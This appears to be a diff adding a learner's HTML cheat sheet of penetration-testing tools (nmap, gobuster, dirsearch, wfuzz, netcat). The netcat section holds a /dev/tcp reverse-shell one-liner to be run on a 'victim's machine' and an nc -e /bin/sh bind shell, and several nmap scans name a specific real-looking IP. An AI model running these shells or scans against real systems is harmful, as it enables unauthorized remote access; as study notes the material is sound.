@@ -1,0 +1,172 @@
+<h2 class="code-line" data-line-start=0 data-line-end=1 ><a id="Some_Usefull_Tools_of_today_0"></a>Some Usefull Tools of today</h2>
+<h4 class="code-line" data-line-start=3 data-line-end=4 ><a id="Nmap_scanning__scripts_3"></a>Nmap (scanning &amp; scripts)</h4>
+<p class="has-line-data" data-line-start="4" data-line-end="8"><code>sudo nmap -sS 14.139.38.108</code>  – scans top 1000 ports<br>
+<code>sudo nmap -sS -p 80,21,8080 14.139.38.108</code> – for specific ports<br>
+<code>sudo nmap -sS -O xx.xxx.xx.xxx</code> -O for scanning OS of host<br>
+<code>sudo nmap -sS -D 14.139.38.110 14.139.38.108</code>   --D for deco</p>
+<p class="has-line-data" data-line-start="9" data-line-end="11"><strong>Using scripts</strong><br>
+<code>nmap –script vuln 14.139.38.108</code> – vuln for running all scripts</p>
+<p class="has-line-data" data-line-start="12" data-line-end="15"><strong>Refer</strong><br>
+<a href="https://www.stationx.net/nmap-cheat-sheet/">Link 1</a>, <a href="https://d00mfist.gitbooks.io/ctf/content/port_scanning.html">Link 2</a><br>
+<a href="https://cdn.comparitech.com/wp-content/uploads/2019/06/Nmap-Cheat-Sheet.pdf">cheatsheet</a></p>
+<p class="has-line-data" data-line-start="16" data-line-end="17"><strong>Alternate options</strong></p>
+<ul>
+<li class="has-line-data" data-line-start="17" data-line-end="18"><a href="https://github.com/Tib3rius/AutoRecon">autorecon</a></li>
+<li class="has-line-data" data-line-start="18" data-line-end="19"><a href="https://github.com/RustScan/RustScan">rustrecon</a></li>
+</ul>
+<h4 class="code-line" data-line-start=21 data-line-end=22 ><a id="Gobuster_21"></a>Gobuster</h4>
+<p class="has-line-data" data-line-start="22" data-line-end="24">eg.<br>
+<code>gobuster dir -u http://xx.xxx.xx.xxx/ -w /path/to/wordlist.txt -x .html,.php,.txt,.png</code></p>
+<ul>
+<li class="has-line-data" data-line-start="24" data-line-end="25"><strong>dir</strong> for telling to do directory scan</li>
+<li class="has-line-data" data-line-start="25" data-line-end="26"><strong>-u</strong> for URL scan</li>
+<li class="has-line-data" data-line-start="26" data-line-end="27"><strong>-w</strong> for wordlist to use for scan</li>
+<li class="has-line-data" data-line-start="27" data-line-end="29"><strong>-x</strong> for file extensions</li>
+</ul>
+<pre><code class="has-line-data" data-line-start="30" data-line-end="54">Usage:
+  gobuster dns [flags]
+
+Flags:
+  -d, --domain string      The target domain
+  -h, --help               help for dns
+  -r, --resolver string    Use custom DNS server (format server.com or server.com:port)
+  -c, --show-cname         Show CNAME records (cannot be used with '-i' option)
+  -i, --show-ips           Show IP addresses
+      --timeout duration   DNS resolver timeout (default 1s)
+      --wildcard           Force continued operation when wildcard found
+
+Global Flags:
+      --delay duration    Time each thread waits between requests (e.g. 1500ms)
+      --no-color          Disable color output
+      --no-error          Don't display errors
+  -z, --no-progress       Don't display progress
+  -o, --output string     Output file to write results to (defaults to stdout)
+  -p, --pattern string    File containing replacement patterns
+  -q, --quiet             Don't print the banner and other noise
+  -t, --threads int       Number of concurrent threads (default 10)
+  -v, --verbose           Verbose output (errors)
+  -w, --wordlist string   Path to the wordlist
+</code></pre>
+<pre><code class="has-line-data" data-line-start="55" data-line-end="96">Usage:
+gobuster dir [flags]
+
+Flags:
+-f, --add-slash                       Append / to each request
+-c, --cookies string                  Cookies to use for the requests
+-d, --discover-backup                 Also search for backup files by appending multiple backup extensions
+    --exclude-length ints             exclude the following content length (completely ignores the status). Supply multiple times to exclude multiple sizes.
+-e, --expanded                        Expanded mode, print full URLs
+-x, --extensions string               File extension(s) to search for
+-r, --follow-redirect                 Follow redirects
+-H, --headers stringArray             Specify HTTP headers, -H 'Header1: val1' -H 'Header2: val2'
+-h, --help                            help for dir
+    --hide-length                     Hide the length of the body in the output
+-m, --method string                   Use the following HTTP method (default &quot;GET&quot;)
+-n, --no-status                       Don't print status codes
+-k, --no-tls-validation               Skip TLS certificate verification
+-P, --password string                 Password for Basic Auth
+    --proxy string                    Proxy to use for requests [http(s)://host:port]
+    --random-agent                    Use a random User-Agent string
+    --retry                           Should retry on request timeout
+    --retry-attempts int              Times to retry on request timeout (default 3)
+-s, --status-codes string             Positive status codes (will be overwritten with status-codes-blacklist if set)
+-b, --status-codes-blacklist string   Negative status codes (will override status-codes if set) (default &quot;404&quot;)
+    --timeout duration                HTTP Timeout (default 10s)
+-u, --url string                      The target URL
+-a, --useragent string                Set the User-Agent string (default &quot;gobuster/3.2.0&quot;)
+-U, --username string                 Username for Basic Auth
+
+Global Flags:
+    --delay duration    Time each thread waits between requests (e.g. 1500ms)
+    --no-color          Disable color output
+    --no-error          Don't display errors
+-z, --no-progress       Don't display progress
+-o, --output string     Output file to write results to (defaults to stdout)
+-p, --pattern string    File containing replacement patterns
+-q, --quiet             Don't print the banner and other noise
+-t, --threads int       Number of concurrent threads (default 10)
+-v, --verbose           Verbose output (errors)
+-w, --wordlist string   Path to the wordlist
+</code></pre>
+<ul>
+<li class="has-line-data" data-line-start="96" data-line-end="98">Refer <a href="https://hackertarget.com/gobuster-tutorial/">link</a></li>
+</ul>
+<p class="has-line-data" data-line-start="98" data-line-end="99"><strong>Alternate options</strong></p>
+<ul>
+<li class="has-line-data" data-line-start="100" data-line-end="107"><a href="https://github.com/maurosoria/dirsearch"><strong>Dirsearch</strong></a><br>
+<a href="https://www.hackingarticles.in/comprehensive-guide-on-dirsearch/">reference</a><br>
+some commands for reference<br>
+<code>dirsearch -u http://target--simple-report=report</code><br>
+<code>dirsearch -u http://target/ --json-report=report</code><br>
+<code>dirsearch -e php,html,js -u https://target -w /path/to/wordlist</code>   -r for recursive scan<br>
+<code>./dirsearch.py -u http://testphp.vulnweb.com/ -s 10</code>   -s for delay</li>
+</ul>
+<h4 class="code-line" data-line-start=109 data-line-end=110 ><a id="Netcat_109"></a>Netcat</h4>
+<p class="has-line-data" data-line-start="111" data-line-end="112"><strong>netcat can be used to</strong></p>
+<ul>
+<li class="has-line-data" data-line-start="112" data-line-end="113">scan to see if a port is open on a remote system</li>
+<li class="has-line-data" data-line-start="113" data-line-end="114">pull the banner from a remote system</li>
+<li class="has-line-data" data-line-start="114" data-line-end="115">connect to a network service manually</li>
+<li class="has-line-data" data-line-start="115" data-line-end="117">remote administration</li>
+</ul>
+<p class="has-line-data" data-line-start="117" data-line-end="118"><strong>Few key switches</strong></p>
+<ul>
+<li class="has-line-data" data-line-start="118" data-line-end="119"><strong>-e</strong> execute</li>
+<li class="has-line-data" data-line-start="119" data-line-end="120"><strong>-l</strong> listen mode</li>
+<li class="has-line-data" data-line-start="120" data-line-end="121"><strong>-n</strong> numeric mode (no DNS. Its faster)</li>
+<li class="has-line-data" data-line-start="121" data-line-end="122"><strong>-p</strong> designates the port</li>
+<li class="has-line-data" data-line-start="122" data-line-end="123"><strong>-u</strong> UDP mode</li>
+<li class="has-line-data" data-line-start="123" data-line-end="125"><strong>-v</strong> verbose output</li>
+</ul>
+<h5 class="code-line" data-line-start=125 data-line-end=126 ><a id="Using_netcat_125"></a>Using netcat</h5>
+<p class="has-line-data" data-line-start="126" data-line-end="128"><code></code><br>
+<strong>for chat</strong></p>
+<p class="has-line-data" data-line-start="129" data-line-end="130"><code>nc -vn 192.168.1.103 22</code> Opening TCP connection between two machines for <code>chat</code></p>
+<p class="has-line-data" data-line-start="131" data-line-end="132">Netcat is capable of creating a simple TCP or UDP connection between two computers and then open a communication channel between them.</p>
+<p class="has-line-data" data-line-start="133" data-line-end="135"><code>nc -l -p 1337</code>  open a listener on the remote system<br>
+<code>nc 192.168.1.105 1377</code>  connect to that listener from a remote machine</p>
+<p class="has-line-data" data-line-start="136" data-line-end="137"><strong>Transferring Files with Netcat</strong></p>
+<p class="has-line-data" data-line-start="138" data-line-end="139">One of the simple wonders of netcat is its ability to transfer files between computers. By creating this simple connection, we can then use that connection to transfer files between two computers. This can be extremely useful as a network administrator and even more useful as a hacker. Netcat can be used to upload and download files from and to the target system.</p>
+<p class="has-line-data" data-line-start="140" data-line-end="141"><code>nc -l -p 6996</code> open a listener on the remote system</p>
+<p class="has-line-data" data-line-start="142" data-line-end="143">Next, let’s send the file to the remote system.</p>
+<p class="has-line-data" data-line-start="144" data-line-end="145"><code>nc 192.168.1.103 6996 &lt; filename</code>  &lt; to direct the file to netcat</p>
+<p class="has-line-data" data-line-start="146" data-line-end="147">Finally, go back to our listening system and we should find that the file has been transferred and appears on the screen!</p>
+<p class="has-line-data" data-line-start="148" data-line-end="149"><strong>Remote Administration with netcat</strong></p>
+<p class="has-line-data" data-line-start="150" data-line-end="151">Probably the most malicious use of netcat <em>and the most effective for the hacker</em> is the ability to use netcat for remote administration. We can use netcat’s ability to execute commands to give the <strong>remote connection a shell on the listening system</strong>. Ways to do it ?? [keep exploring…]</p>
+<p class="has-line-data" data-line-start="152" data-line-end="154"><code>sudo nc -lvnp 8809</code> for listening (in general)<br>
+and when the connection command is executed on victim’s machine we’ll get it’s shell access.</p>
+<p class="has-line-data" data-line-start="155" data-line-end="156"><code>sh -i 5&lt;&gt; /dev/tcp/10.10.10.10/9001 0&lt;&amp;5 1&gt;&amp;5 2&gt;&amp;5</code> <em>the</em> connection command</p>
+<p class="has-line-data" data-line-start="157" data-line-end="158"><code>nc -l -p6996 -e /bin/sh</code>  <em>explore <strong>this</strong> one</em> ;)</p>
+<p class="has-line-data" data-line-start="159" data-line-end="160"><strong>Alternate options</strong></p>
+<ul>
+<li class="has-line-data" data-line-start="161" data-line-end="162"><a href="https://github.com/maurosoria/dirsearch">Rustcat</a></li>
+<li class="has-line-data" data-line-start="162" data-line-end="164"><a href="https://www.hackingarticles.in/comprehensive-guide-on-dirsearch/">Pwncat</a></li>
+</ul>
+<p class="has-line-data" data-line-start="164" data-line-end="165">I ain’t gonna give explainations for these ;() , jzz find em 🤷‍♂️</p>
+<h4 class="code-line" data-line-start=167 data-line-end=168 ><a id="Simplehttpserver_167"></a>Simplehttpserver</h4>
+<p class="has-line-data" data-line-start="169" data-line-end="170"><code>sudo python -m http.server 80</code></p>
+<h4 class="code-line" data-line-start=172 data-line-end=173 ><a id="Wfuzz_172"></a>Wfuzz</h4>
+<p class="has-line-data" data-line-start="174" data-line-end="176">some commands for reference<br>
+<code>wfuzz -w path/to/wordlist.txt --hc 404,403 http://website.com/FUZZ</code></p>
+<ul>
+<li class="has-line-data" data-line-start="176" data-line-end="177">-w for specifying wordlist path</li>
+<li class="has-line-data" data-line-start="177" data-line-end="178">–hc for hiding responses having error codes 404, 403</li>
+<li class="has-line-data" data-line-start="178" data-line-end="180"><strong>FUZZ</strong> word used for telling where to use wordlist</li>
+</ul>
+<p class="has-line-data" data-line-start="180" data-line-end="182">for passing cookies in the request<br>
+<code>wfuzz -z file,path/to/wordlist.txt -b cookie=value1 -b cookie2=value2 http://testphp.vulnweb.com/FUZZ</code></p>
+<p class="has-line-data" data-line-start="183" data-line-end="185">for passing headers<br>
+<code>wfuzz -z file,path/to/wordlist.txt -H &quot;myheader: headervalue&quot; -H &quot;User-Agent: palemoon&quot; http://example.com/FUZZ</code></p>
+<p class="has-line-data" data-line-start="186" data-line-end="188">Additional filters can also be used for filtering displayed requests.<br>
+<code>--filter &quot;c=200 and l&gt;197&quot;</code> will filter to show only status code 200 , length &gt; 197</p>
+<p class="has-line-data" data-line-start="189" data-line-end="190"><a href="https://github.com/xmendez/wfuzz">explore more</a></p>
+<h6 class="code-line" data-line-start=192 data-line-end=193 ><a id="Things_to_explore_192"></a>Things to explore</h6>
+<ul>
+<li class="has-line-data" data-line-start="193" data-line-end="194">what is hosts file ??</li>
+<li class="has-line-data" data-line-start="194" data-line-end="195">3-way handshake</li>
+<li class="has-line-data" data-line-start="195" data-line-end="197">cryptcat</li>
+</ul>
+<h6 class="code-line" data-line-start=197 data-line-end=198 ><a id="Explore_later_197"></a>Explore later</h6>
+<ul>
+<li class="has-line-data" data-line-start="198" data-line-end="199">Rlwrap</li>
+</ul>
